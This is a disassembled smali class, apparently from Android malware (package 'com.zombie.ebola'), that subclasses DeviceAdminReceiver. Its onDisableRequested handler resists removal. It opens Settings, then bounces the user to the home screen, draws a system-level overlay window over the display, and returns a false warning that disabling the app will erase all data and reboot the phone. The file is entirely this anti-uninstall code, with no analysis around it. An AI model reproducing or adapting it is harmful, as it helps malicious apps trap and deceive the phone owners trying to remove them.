.class public Lcom/zombie/ebola/goro;
.super Landroid/app/admin/DeviceAdminReceiver;


# instance fields
.field a:Landroid/view/WindowManager$LayoutParams;

.field b:Landroid/view/WindowManager;

.field c:Landroid/view/LayoutInflater;

.field d:Landroid/view/View;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method

.method private a(Ljava/lang/String;)Landroid/content/Intent;
    .locals 1

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    return-object v0
.end method

.method private a(Landroid/content/Context;)Landroid/view/LayoutInflater;
    .locals 1

    const-string v0, "layout_inflater"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/LayoutInflater;

    return-object v0
.end method

.method private a()V
    .locals 2

    iget-object v0, p0, Lcom/zombie/ebola/goro;->b:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/zombie/ebola/goro;->d:Landroid/view/View;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    return-void
.end method

.method private a(Landroid/content/Intent;I)V
    .locals 0

    invoke-virtual {p1, p2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    return-void
.end method

.method private a(Landroid/content/Intent;Ljava/lang/String;)V
    .locals 0

    invoke-virtual {p1, p2}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    return-void
.end method

.method static synthetic a(Lcom/zombie/ebola/goro;)V
    .locals 0

    invoke-direct {p0}, Lcom/zombie/ebola/goro;->a()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 6

    const/high16 v2, 0x10000000

    const-string v0, "android.settings.SETTINGS"

    invoke-direct {p0, v0}, Lcom/zombie/ebola/goro;->a(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x40000000    # 2.0f

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/goro;->a(Landroid/content/Intent;I)V

    invoke-direct {p0, v0, v2}, Lcom/zombie/ebola/goro;->a(Landroid/content/Intent;I)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string v0, "android.intent.action.MAIN"

    invoke-direct {p0, v0}, Lcom/zombie/ebola/goro;->a(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "android.intent.category.HOME"

    invoke-direct {p0, v0, v1}, Lcom/zombie/ebola/goro;->a(Landroid/content/Intent;Ljava/lang/String;)V

    invoke-direct {p0, v0, v2}, Lcom/zombie/ebola/goro;->a(Landroid/content/Intent;I)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/4 v1, -0x1

    const/4 v2, -0x2

    const/16 v3, 0x7da

    const/16 v4, 0x400

    const/4 v5, -0x3

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    iput-object v0, p0, Lcom/zombie/ebola/goro;->a:Landroid/view/WindowManager$LayoutParams;

    const-string v0, "window"

    invoke-virtual {p1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lcom/zombie/ebola/goro;->b:Landroid/view/WindowManager;

    invoke-direct {p0, p1}, Lcom/zombie/ebola/goro;->a(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v0

    iput-object v0, p0, Lcom/zombie/ebola/goro;->c:Landroid/view/LayoutInflater;

    iget-object v0, p0, Lcom/zombie/ebola/goro;->c:Landroid/view/LayoutInflater;

    const v1, 0x7f030008

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v1

    iput-object v1, p0, Lcom/zombie/ebola/goro;->d:Landroid/view/View;

    iget-object v0, p0, Lcom/zombie/ebola/goro;->a:Landroid/view/WindowManager$LayoutParams;

    iget-object v2, p0, Lcom/zombie/ebola/goro;->b:Landroid/view/WindowManager;

    invoke-interface {v2, v1, v0}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const v0, 0x7f070039

    invoke-virtual {v1, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/Button;

    const v2, 0x7f070038

    invoke-virtual {v1, v2}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    new-instance v2, Lcom/zombie/ebola/i;

    invoke-direct {v2, p0, v1, v0}, Lcom/zombie/ebola/i;-><init>(Lcom/zombie/ebola/goro;Landroid/widget/TextView;Landroid/widget/Button;)V

    invoke-virtual {v0, v2}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string v0, "This action will reset all your data.\n\nClick \"Yes\" and your\'s device will reboot and \"No\" for cancel."

    return-object v0
.end method
